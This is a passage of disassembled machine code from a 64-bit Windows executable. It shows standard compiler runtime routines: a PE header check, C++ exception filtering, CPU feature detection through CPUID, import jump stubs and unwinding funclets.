   14000748b:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   140007492:	75 23                	jne    0x1400074b7
   140007494:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140007499:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   14000749e:	75 17                	jne    0x1400074b7
   1400074a0:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   1400074a7:	0e 
   1400074a8:	76 0d                	jbe    0x1400074b7
   1400074aa:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400074b1:	00 
   1400074b2:	0f 95 c0             	setne  %al
   1400074b5:	eb 02                	jmp    0x1400074b9
   1400074b7:	32 c0                	xor    %al,%al
   1400074b9:	48 83 c4 28          	add    $0x28,%rsp
   1400074bd:	c3                   	ret
   1400074be:	cc                   	int3
   1400074bf:	cc                   	int3
   1400074c0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400074d0
   1400074c7:	48 ff 25 0a 0c 00 00 	rex.W jmp *0xc0a(%rip)        # 0x1400080d8
   1400074ce:	cc                   	int3
   1400074cf:	cc                   	int3
   1400074d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400074d5:	57                   	push   %rdi
   1400074d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400074da:	48 8b 19             	mov    (%rcx),%rbx
   1400074dd:	48 8b f9             	mov    %rcx,%rdi
   1400074e0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400074e6:	75 24                	jne    0x14000750c
   1400074e8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400074ec:	75 1e                	jne    0x14000750c
   1400074ee:	8b 53 20             	mov    0x20(%rbx),%edx
   1400074f1:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   1400074f7:	74 20                	je     0x140007519
   1400074f9:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   1400074ff:	83 f8 01             	cmp    $0x1,%eax
   140007502:	76 15                	jbe    0x140007519
   140007504:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   14000750a:	74 0d                	je     0x140007519
   14000750c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007511:	33 c0                	xor    %eax,%eax
   140007513:	48 83 c4 20          	add    $0x20,%rsp
   140007517:	5f                   	pop    %rdi
   140007518:	c3                   	ret
   140007519:	e8 ca 03 00 00       	call   0x1400078e8
   14000751e:	48 89 18             	mov    %rbx,(%rax)
   140007521:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140007525:	e8 c4 03 00 00       	call   0x1400078ee
   14000752a:	48 89 18             	mov    %rbx,(%rax)
   14000752d:	e8 c8 03 00 00       	call   0x1400078fa
   140007532:	cc                   	int3
   140007533:	cc                   	int3
   140007534:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007539:	57                   	push   %rdi
   14000753a:	48 83 ec 20          	sub    $0x20,%rsp
   14000753e:	48 8d 1d cb 27 00 00 	lea    0x27cb(%rip),%rbx        # 0x140009d10
   140007545:	48 8d 3d c4 27 00 00 	lea    0x27c4(%rip),%rdi        # 0x140009d10
   14000754c:	eb 12                	jmp    0x140007560
   14000754e:	48 8b 03             	mov    (%rbx),%rax
   140007551:	48 85 c0             	test   %rax,%rax
   140007554:	74 06                	je     0x14000755c
   140007556:	ff 15 f4 10 00 00    	call   *0x10f4(%rip)        # 0x140008650
   14000755c:	48 83 c3 08          	add    $0x8,%rbx
   140007560:	48 3b df             	cmp    %rdi,%rbx
   140007563:	72 e9                	jb     0x14000754e
   140007565:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000756a:	48 83 c4 20          	add    $0x20,%rsp
   14000756e:	5f                   	pop    %rdi
   14000756f:	c3                   	ret
   140007570:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007575:	57                   	push   %rdi
   140007576:	48 83 ec 20          	sub    $0x20,%rsp
   14000757a:	48 8d 1d 9f 27 00 00 	lea    0x279f(%rip),%rbx        # 0x140009d20
   140007581:	48 8d 3d 98 27 00 00 	lea    0x2798(%rip),%rdi        # 0x140009d20
   140007588:	eb 12                	jmp    0x14000759c
   14000758a:	48 8b 03             	mov    (%rbx),%rax
   14000758d:	48 85 c0             	test   %rax,%rax
   140007590:	74 06                	je     0x140007598
   140007592:	ff 15 b8 10 00 00    	call   *0x10b8(%rip)        # 0x140008650
   140007598:	48 83 c3 08          	add    $0x8,%rbx
   14000759c:	48 3b df             	cmp    %rdi,%rbx
   14000759f:	72 e9                	jb     0x14000758a
   1400075a1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400075a6:	48 83 c4 20          	add    $0x20,%rsp
   1400075aa:	5f                   	pop    %rdi
   1400075ab:	c3                   	ret
   1400075ac:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400075b1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400075b6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400075bb:	57                   	push   %rdi
   1400075bc:	48 83 ec 10          	sub    $0x10,%rsp
   1400075c0:	33 c0                	xor    %eax,%eax
   1400075c2:	33 c9                	xor    %ecx,%ecx
   1400075c4:	0f a2                	cpuid
   1400075c6:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   1400075cc:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   1400075d2:	0b d1                	or     %ecx,%edx
   1400075d4:	8b e8                	mov    %eax,%ebp
   1400075d6:	b8 01 00 00 00       	mov    $0x1,%eax
   1400075db:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   1400075e1:	0b d3                	or     %ebx,%edx
   1400075e3:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1400075e6:	0f a2                	cpuid
   1400075e8:	8b f9                	mov    %ecx,%edi
   1400075ea:	75 5e                	jne    0x14000764a
   1400075ec:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1400075f1:	48 c7 05 a4 5a 00 00 	movq   $0x8000,0x5aa4(%rip)        # 0x14000d0a0
   1400075f8:	00 80 00 00 
   1400075fc:	48 c7 05 a1 5a 00 00 	movq   $0xffffffffffffffff,0x5aa1(%rip)        # 0x14000d0a8
   140007603:	ff ff ff ff 
   140007607:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000760c:	74 28                	je     0x140007636
   14000760e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140007613:	74 21                	je     0x140007636
   140007615:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000761a:	74 1a                	je     0x140007636
   14000761c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140007621:	83 f8 20             	cmp    $0x20,%eax
   140007624:	77 24                	ja     0x14000764a
   140007626:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000762d:	00 00 00 
   140007630:	48 0f a3 c1          	bt     %rax,%rcx
   140007634:	73 14                	jae    0x14000764a
   140007636:	44 8b 05 33 63 00 00 	mov    0x6333(%rip),%r8d        # 0x14000d970
   14000763d:	41 83 c8 01          	or     $0x1,%r8d
   140007641:	44 89 05 28 63 00 00 	mov    %r8d,0x6328(%rip)        # 0x14000d970
   140007648:	eb 07                	jmp    0x140007651
   14000764a:	44 8b 05 1f 63 00 00 	mov    0x631f(%rip),%r8d        # 0x14000d970
   140007651:	45 33 c9             	xor    %r9d,%r9d
   140007654:	41 8b f1             	mov    %r9d,%esi
   140007657:	45 8b d1             	mov    %r9d,%r10d
   14000765a:	45 8b d9             	mov    %r9d,%r11d
   14000765d:	83 fd 07             	cmp    $0x7,%ebp
   140007660:	7c 40                	jl     0x1400076a2
   140007662:	41 8d 41 07          	lea    0x7(%r9),%eax
   140007666:	33 c9                	xor    %ecx,%ecx
   140007668:	0f a2                	cpuid
   14000766a:	8b f2                	mov    %edx,%esi
   14000766c:	44 8b cb             	mov    %ebx,%r9d
   14000766f:	0f ba e3 09          	bt     $0x9,%ebx
   140007673:	73 0b                	jae    0x140007680
   140007675:	41 83 c8 02          	or     $0x2,%r8d
   140007679:	44 89 05 f0 62 00 00 	mov    %r8d,0x62f0(%rip)        # 0x14000d970
   140007680:	83 f8 01             	cmp    $0x1,%eax
   140007683:	7c 0d                	jl     0x140007692
   140007685:	b8 07 00 00 00       	mov    $0x7,%eax
   14000768a:	8d 48 fa             	lea    -0x6(%rax),%ecx
   14000768d:	0f a2                	cpuid
   14000768f:	44 8b d2             	mov    %edx,%r10d
   140007692:	b8 24 00 00 00       	mov    $0x24,%eax
   140007697:	3b e8                	cmp    %eax,%ebp
   140007699:	7c 07                	jl     0x1400076a2
   14000769b:	33 c9                	xor    %ecx,%ecx
   14000769d:	0f a2                	cpuid
   14000769f:	44 8b db             	mov    %ebx,%r11d
   1400076a2:	48 8b 05 e7 59 00 00 	mov    0x59e7(%rip),%rax        # 0x14000d090
   1400076a9:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   1400076ad:	c7 05 e1 59 00 00 01 	movl   $0x1,0x59e1(%rip)        # 0x14000d098
   1400076b4:	00 00 00 
   1400076b7:	c7 05 db 59 00 00 02 	movl   $0x2,0x59db(%rip)        # 0x14000d09c
   1400076be:	00 00 00 
   1400076c1:	48 89 05 c8 59 00 00 	mov    %rax,0x59c8(%rip)        # 0x14000d090
   1400076c8:	0f ba e7 14          	bt     $0x14,%edi
   1400076cc:	73 1f                	jae    0x1400076ed
   1400076ce:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   1400076d2:	c7 05 bc 59 00 00 02 	movl   $0x2,0x59bc(%rip)        # 0x14000d098
   1400076d9:	00 00 00 
   1400076dc:	48 89 05 ad 59 00 00 	mov    %rax,0x59ad(%rip)        # 0x14000d090
   1400076e3:	c7 05 af 59 00 00 06 	movl   $0x6,0x59af(%rip)        # 0x14000d09c
   1400076ea:	00 00 00 
   1400076ed:	0f ba e7 1b          	bt     $0x1b,%edi
   1400076f1:	0f 83 33 01 00 00    	jae    0x14000782a
   1400076f7:	33 c9                	xor    %ecx,%ecx
   1400076f9:	0f 01 d0             	xgetbv
   1400076fc:	48 c1 e2 20          	shl    $0x20,%rdx
   140007700:	48 0b d0             	or     %rax,%rdx
   140007703:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140007708:	0f ba e7 1c          	bt     $0x1c,%edi
   14000770c:	0f 83 fc 00 00 00    	jae    0x14000780e
   140007712:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007717:	24 06                	and    $0x6,%al
   140007719:	3c 06                	cmp    $0x6,%al
   14000771b:	0f 85 ed 00 00 00    	jne    0x14000780e
   140007721:	8b 05 75 59 00 00    	mov    0x5975(%rip),%eax        # 0x14000d09c
   140007727:	b2 e0                	mov    $0xe0,%dl
   140007729:	83 c8 08             	or     $0x8,%eax
   14000772c:	c7 05 62 59 00 00 03 	movl   $0x3,0x5962(%rip)        # 0x14000d098
   140007733:	00 00 00 
   140007736:	89 05 60 59 00 00    	mov    %eax,0x5960(%rip)        # 0x14000d09c
   14000773c:	41 f6 c1 20          	test   $0x20,%r9b
   140007740:	74 62                	je     0x1400077a4
   140007742:	83 c8 20             	or     $0x20,%eax
   140007745:	c7 05 49 59 00 00 05 	movl   $0x5,0x5949(%rip)        # 0x14000d098
   14000774c:	00 00 00 
   14000774f:	89 05 47 59 00 00    	mov    %eax,0x5947(%rip)        # 0x14000d09c
   140007755:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   14000775a:	48 8b 05 2f 59 00 00 	mov    0x592f(%rip),%rax        # 0x14000d090
   140007761:	44 23 c9             	and    %ecx,%r9d
   140007764:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140007768:	48 89 05 21 59 00 00 	mov    %rax,0x5921(%rip)        # 0x14000d090
   14000776f:	44 3b c9             	cmp    %ecx,%r9d
   140007772:	75 37                	jne    0x1400077ab
   140007774:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007779:	22 c2                	and    %dl,%al
   14000777b:	3a c2                	cmp    %dl,%al
   14000777d:	75 25                	jne    0x1400077a4
   14000777f:	48 8b 05 0a 59 00 00 	mov    0x590a(%rip),%rax        # 0x14000d090
   140007786:	83 0d 0f 59 00 00 40 	orl    $0x40,0x590f(%rip)        # 0x14000d09c
   14000778d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140007791:	c7 05 fd 58 00 00 06 	movl   $0x6,0x58fd(%rip)        # 0x14000d098
   140007798:	00 00 00 
   14000779b:	48 89 05 ee 58 00 00 	mov    %rax,0x58ee(%rip)        # 0x14000d090
   1400077a2:	eb 07                	jmp    0x1400077ab
   1400077a4:	48 8b 05 e5 58 00 00 	mov    0x58e5(%rip),%rax        # 0x14000d090
   1400077ab:	0f ba e6 17          	bt     $0x17,%esi
   1400077af:	73 0c                	jae    0x1400077bd
   1400077b1:	48 0f ba f0 18       	btr    $0x18,%rax
   1400077b6:	48 89 05 d3 58 00 00 	mov    %rax,0x58d3(%rip)        # 0x14000d090
   1400077bd:	41 0f ba e2 13       	bt     $0x13,%r10d
   1400077c2:	73 4a                	jae    0x14000780e
   1400077c4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400077c9:	22 c2                	and    %dl,%al
   1400077cb:	3a c2                	cmp    %dl,%al
   1400077cd:	75 3f                	jne    0x14000780e
   1400077cf:	41 8b cb             	mov    %r11d,%ecx
   1400077d2:	41 8b c3             	mov    %r11d,%eax
   1400077d5:	48 c1 e9 10          	shr    $0x10,%rcx
   1400077d9:	25 ff 00 04 00       	and    $0x400ff,%eax
   1400077de:	83 e1 06             	and    $0x6,%ecx
   1400077e1:	89 05 85 61 00 00    	mov    %eax,0x6185(%rip)        # 0x14000d96c
   1400077e7:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   1400077ee:	48 f7 d1             	not    %rcx
   1400077f1:	48 23 0d 98 58 00 00 	and    0x5898(%rip),%rcx        # 0x14000d090
   1400077f8:	48 89 0d 91 58 00 00 	mov    %rcx,0x5891(%rip)        # 0x14000d090
   1400077ff:	3c 01                	cmp    $0x1,%al
   140007801:	76 0b                	jbe    0x14000780e
   140007803:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140007807:	48 89 0d 82 58 00 00 	mov    %rcx,0x5882(%rip)        # 0x14000d090
   14000780e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140007813:	73 15                	jae    0x14000782a
   140007815:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000781a:	48 0f ba e0 13       	bt     $0x13,%rax
   14000781f:	73 09                	jae    0x14000782a
   140007821:	48 0f ba 35 66 58 00 	btrq   $0x7,0x5866(%rip)        # 0x14000d090
   140007828:	00 07 
   14000782a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000782f:	33 c0                	xor    %eax,%eax
   140007831:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140007836:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000783b:	48 83 c4 10          	add    $0x10,%rsp
   14000783f:	5f                   	pop    %rdi
   140007840:	c3                   	ret
   140007841:	cc                   	int3
   140007842:	cc                   	int3
   140007843:	cc                   	int3
   140007844:	33 c0                	xor    %eax,%eax
   140007846:	39 05 64 58 00 00    	cmp    %eax,0x5864(%rip)        # 0x14000d0b0
   14000784c:	0f 95 c0             	setne  %al
   14000784f:	c3                   	ret
   140007850:	48 83 ec 28          	sub    $0x28,%rsp
   140007854:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140007858:	48 8b ca             	mov    %rdx,%rcx
   14000785b:	49 8b d1             	mov    %r9,%rdx
   14000785e:	e8 0d 00 00 00       	call   0x140007870
   140007863:	b8 01 00 00 00       	mov    $0x1,%eax
   140007868:	48 83 c4 28          	add    $0x28,%rsp
   14000786c:	c3                   	ret
   14000786d:	cc                   	int3
   14000786e:	cc                   	int3
   14000786f:	cc                   	int3
   140007870:	40 53                	rex push %rbx
   140007872:	45 8b 18             	mov    (%r8),%r11d
   140007875:	48 8b da             	mov    %rdx,%rbx
   140007878:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000787c:	4c 8b c9             	mov    %rcx,%r9
   14000787f:	41 f6 00 04          	testb  $0x4,(%r8)
   140007883:	4c 8b d1             	mov    %rcx,%r10
   140007886:	74 13                	je     0x14000789b
   140007888:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000788c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140007890:	f7 d8                	neg    %eax
   140007892:	4c 03 d1             	add    %rcx,%r10
   140007895:	48 63 c8             	movslq %eax,%rcx
   140007898:	4c 23 d1             	and    %rcx,%r10
   14000789b:	49 63 c3             	movslq %r11d,%rax
   14000789e:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400078a2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400078a6:	8b 48 08             	mov    0x8(%rax),%ecx
   1400078a9:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400078ad:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1400078b2:	74 10                	je     0x1400078c4
   1400078b4:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   1400078b9:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   1400078be:	48 23 c1             	and    %rcx,%rax
   1400078c1:	4c 03 c8             	add    %rax,%r9
   1400078c4:	4c 33 ca             	xor    %rdx,%r9
   1400078c7:	49 8b c9             	mov    %r9,%rcx
   1400078ca:	5b                   	pop    %rbx
   1400078cb:	e9 b0 f0 ff ff       	jmp    0x140006980
   1400078d0:	ff 25 62 0b 00 00    	jmp    *0xb62(%rip)        # 0x140008438
   1400078d6:	ff 25 24 0b 00 00    	jmp    *0xb24(%rip)        # 0x140008400
   1400078dc:	ff 25 16 0b 00 00    	jmp    *0xb16(%rip)        # 0x1400083f8
   1400078e2:	ff 25 08 0b 00 00    	jmp    *0xb08(%rip)        # 0x1400083f0
   1400078e8:	ff 25 fa 0a 00 00    	jmp    *0xafa(%rip)        # 0x1400083e8
   1400078ee:	ff 25 ec 0a 00 00    	jmp    *0xaec(%rip)        # 0x1400083e0
   1400078f4:	ff 25 26 0b 00 00    	jmp    *0xb26(%rip)        # 0x140008420
   1400078fa:	ff 25 38 0c 00 00    	jmp    *0xc38(%rip)        # 0x140008538
   140007900:	ff 25 7a 0b 00 00    	jmp    *0xb7a(%rip)        # 0x140008480
   140007906:	ff 25 64 0b 00 00    	jmp    *0xb64(%rip)        # 0x140008470
   14000790c:	ff 25 66 0b 00 00    	jmp    *0xb66(%rip)        # 0x140008478
   140007912:	ff 25 00 0c 00 00    	jmp    *0xc00(%rip)        # 0x140008518
   140007918:	ff 25 02 0c 00 00    	jmp    *0xc02(%rip)        # 0x140008520
   14000791e:	ff 25 84 0b 00 00    	jmp    *0xb84(%rip)        # 0x1400084a8
   140007924:	ff 25 be 0b 00 00    	jmp    *0xbbe(%rip)        # 0x1400084e8
   14000792a:	ff 25 10 0c 00 00    	jmp    *0xc10(%rip)        # 0x140008540
   140007930:	ff 25 fa 0b 00 00    	jmp    *0xbfa(%rip)        # 0x140008530
   140007936:	ff 25 ec 0b 00 00    	jmp    *0xbec(%rip)        # 0x140008528
   14000793c:	ff 25 ae 0b 00 00    	jmp    *0xbae(%rip)        # 0x1400084f0
   140007942:	ff 25 98 0b 00 00    	jmp    *0xb98(%rip)        # 0x1400084e0
   140007948:	ff 25 6a 0b 00 00    	jmp    *0xb6a(%rip)        # 0x1400084b8
   14000794e:	ff 25 4c 0c 00 00    	jmp    *0xc4c(%rip)        # 0x1400085a0
   140007954:	ff 25 6e 0b 00 00    	jmp    *0xb6e(%rip)        # 0x1400084c8
   14000795a:	ff 25 70 0b 00 00    	jmp    *0xb70(%rip)        # 0x1400084d0
   140007960:	ff 25 72 0b 00 00    	jmp    *0xb72(%rip)        # 0x1400084d8
   140007966:	ff 25 2c 0b 00 00    	jmp    *0xb2c(%rip)        # 0x140008498
   14000796c:	ff 25 16 0b 00 00    	jmp    *0xb16(%rip)        # 0x140008488
   140007972:	ff 25 10 0c 00 00    	jmp    *0xc10(%rip)        # 0x140008588
   140007978:	ff 25 7a 0b 00 00    	jmp    *0xb7a(%rip)        # 0x1400084f8
   14000797e:	ff 25 7c 0b 00 00    	jmp    *0xb7c(%rip)        # 0x140008500
   140007984:	ff 25 7e 0b 00 00    	jmp    *0xb7e(%rip)        # 0x140008508
   14000798a:	cc                   	int3
   14000798b:	cc                   	int3
   14000798c:	48 8b c4             	mov    %rsp,%rax
   14000798f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007993:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007997:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000799b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000799f:	41 56                	push   %r14
   1400079a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400079a5:	49 8b 59 38          	mov    0x38(%r9),%rbx
   1400079a9:	48 8b f2             	mov    %rdx,%rsi
   1400079ac:	4d 8b f0             	mov    %r8,%r14
   1400079af:	48 8b e9             	mov    %rcx,%rbp
   1400079b2:	49 8b d1             	mov    %r9,%rdx
   1400079b5:	48 8b ce             	mov    %rsi,%rcx
   1400079b8:	49 8b f9             	mov    %r9,%rdi
   1400079bb:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   1400079bf:	e8 ac fe ff ff       	call   0x140007870
   1400079c4:	8b 45 04             	mov    0x4(%rbp),%eax
   1400079c7:	24 66                	and    $0x66,%al
   1400079c9:	f6 d8                	neg    %al
   1400079cb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400079d0:	45 1b c9             	sbb    %r9d,%r9d
   1400079d3:	41 f7 d9             	neg    %r9d
   1400079d6:	44 03 c8             	add    %eax,%r9d
   1400079d9:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   1400079dd:	74 11                	je     0x1400079f0
   1400079df:	4c 8b cf             	mov    %rdi,%r9
   1400079e2:	4d 8b c6             	mov    %r14,%r8
   1400079e5:	48 8b d6             	mov    %rsi,%rdx
   1400079e8:	48 8b cd             	mov    %rbp,%rcx
   1400079eb:	e8 e0 fe ff ff       	call   0x1400078d0
   1400079f0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400079f5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400079fa:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400079ff:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140007a04:	48 83 c4 20          	add    $0x20,%rsp
   140007a08:	41 5e                	pop    %r14
   140007a0a:	c3                   	ret
   140007a0b:	ff 25 07 0a 00 00    	jmp    *0xa07(%rip)        # 0x140008418
   140007a11:	ff 25 11 0a 00 00    	jmp    *0xa11(%rip)        # 0x140008428
   140007a17:	cc                   	int3
   140007a18:	cc                   	int3
   140007a19:	cc                   	int3
   140007a1a:	cc                   	int3
   140007a1b:	cc                   	int3
   140007a1c:	cc                   	int3
   140007a1d:	cc                   	int3
   140007a1e:	cc                   	int3
   140007a1f:	cc                   	int3
   140007a20:	cc                   	int3
   140007a21:	cc                   	int3
   140007a22:	cc                   	int3
   140007a23:	cc                   	int3
   140007a24:	cc                   	int3
   140007a25:	cc                   	int3
   140007a26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007a2d:	00 00 00 
   140007a30:	ff e0                	jmp    *%rax
   140007a32:	cc                   	int3
   140007a33:	cc                   	int3
   140007a34:	cc                   	int3
   140007a35:	cc                   	int3
   140007a36:	cc                   	int3
   140007a37:	cc                   	int3
   140007a38:	cc                   	int3
   140007a39:	cc                   	int3
   140007a3a:	cc                   	int3
   140007a3b:	cc                   	int3
   140007a3c:	cc                   	int3
   140007a3d:	cc                   	int3
   140007a3e:	cc                   	int3
   140007a3f:	cc                   	int3
   140007a40:	cc                   	int3
   140007a41:	cc                   	int3
   140007a42:	cc                   	int3
   140007a43:	cc                   	int3
   140007a44:	cc                   	int3
   140007a45:	cc                   	int3
   140007a46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007a4d:	00 00 00 
   140007a50:	ff 25 fa 0b 00 00    	jmp    *0xbfa(%rip)        # 0x140008650
   140007a56:	cc                   	int3
   140007a57:	cc                   	int3
   140007a58:	cc                   	int3
   140007a59:	cc                   	int3
   140007a5a:	cc                   	int3
   140007a5b:	cc                   	int3
   140007a5c:	cc                   	int3
   140007a5d:	cc                   	int3
   140007a5e:	cc                   	int3
   140007a5f:	cc                   	int3
   140007a60:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140007a67:	e9 34 99 ff ff       	jmp    0x1400013a0
   140007a6c:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007a73:	e9 28 99 ff ff       	jmp    0x1400013a0
   140007a78:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   140007a7f:	e9 1c 99 ff ff       	jmp    0x1400013a0
   140007a84:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140007a8b:	e9 10 99 ff ff       	jmp    0x1400013a0
   140007a90:	40 55                	rex push %rbp
   140007a92:	48 83 ec 20          	sub    $0x20,%rsp
   140007a96:	48 8b ea             	mov    %rdx,%rbp
   140007a99:	ba 18 00 00 00       	mov    $0x18,%edx
   140007a9e:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007aa2:	e8 f9 ee ff ff       	call   0x1400069a0
   140007aa7:	48 83 c4 20          	add    $0x20,%rsp
   140007aab:	5d                   	pop    %rbp
   140007aac:	c3                   	ret
   140007aad:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007ab4:	e9 77 98 ff ff       	jmp    0x140001330
   140007ab9:	40 55                	rex push %rbp
   140007abb:	48 83 ec 20          	sub    $0x20,%rsp
   140007abf:	48 8b ea             	mov    %rdx,%rbp
   140007ac2:	ba 18 00 00 00       	mov    $0x18,%edx
   140007ac7:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007acb:	e8 d0 ee ff ff       	call   0x1400069a0
   140007ad0:	48 83 c4 20          	add    $0x20,%rsp
   140007ad4:	5d                   	pop    %rbp
   140007ad5:	c3                   	ret
   140007ad6:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007add:	e9 4e 98 ff ff       	jmp    0x140001330
   140007ae2:	40 55                	rex push %rbp
   140007ae4:	48 83 ec 20          	sub    $0x20,%rsp
   140007ae8:	48 8b ea             	mov    %rdx,%rbp
   140007aeb:	ba 18 00 00 00       	mov    $0x18,%edx
   140007af0:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007af4:	e8 a7 ee ff ff       	call   0x1400069a0
   140007af9:	48 83 c4 20          	add    $0x20,%rsp
   140007afd:	5d                   	pop    %rbp
   140007afe:	c3                   	ret
   140007aff:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007b06:	e9 25 98 ff ff       	jmp    0x140001330
   140007b0b:	40 55                	rex push %rbp
   140007b0d:	48 83 ec 20          	sub    $0x20,%rsp
   140007b11:	48 8b ea             	mov    %rdx,%rbp
   140007b14:	ba 18 00 00 00       	mov    $0x18,%edx
   140007b19:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007b1d:	e8 7e ee ff ff       	call   0x1400069a0
   140007b22:	48 83 c4 20          	add    $0x20,%rsp
   140007b26:	5d                   	pop    %rbp
   140007b27:	c3                   	ret
   140007b28:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007b2f:	e9 fc 97 ff ff       	jmp    0x140001330
   140007b34:	40 55                	rex push %rbp
   140007b36:	48 83 ec 20          	sub    $0x20,%rsp
   140007b3a:	48 8b ea             	mov    %rdx,%rbp
   140007b3d:	ba 18 00 00 00       	mov    $0x18,%edx
   140007b42:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007b46:	e8 55 ee ff ff       	call   0x1400069a0
   140007b4b:	48 83 c4 20          	add    $0x20,%rsp
   140007b4f:	5d                   	pop    %rbp
   140007b50:	c3                   	ret
   140007b51:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007b58:	e9 d3 97 ff ff       	jmp    0x140001330
   140007b5d:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140007b64:	e9 37 98 ff ff       	jmp    0x1400013a0
   140007b69:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007b70:	e9 2b 98 ff ff       	jmp    0x1400013a0
   140007b75:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140007b7c:	e9 1f 98 ff ff       	jmp    0x1400013a0
   140007b81:	40 55                	rex push %rbp
   140007b83:	48 83 ec 20          	sub    $0x20,%rsp
   140007b87:	48 8b ea             	mov    %rdx,%rbp
   140007b8a:	ba 18 00 00 00       	mov    $0x18,%edx
   140007b8f:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007b93:	e8 08 ee ff ff       	call   0x1400069a0
   140007b98:	48 83 c4 20          	add    $0x20,%rsp
   140007b9c:	5d                   	pop    %rbp
   140007b9d:	c3                   	ret
   140007b9e:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007ba5:	e9 86 97 ff ff       	jmp    0x140001330
   140007baa:	cc                   	int3
   140007bab:	cc                   	int3
   140007bac:	cc                   	int3
   140007bad:	cc                   	int3
   140007bae:	cc                   	int3
   140007baf:	cc                   	int3
   140007bb0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
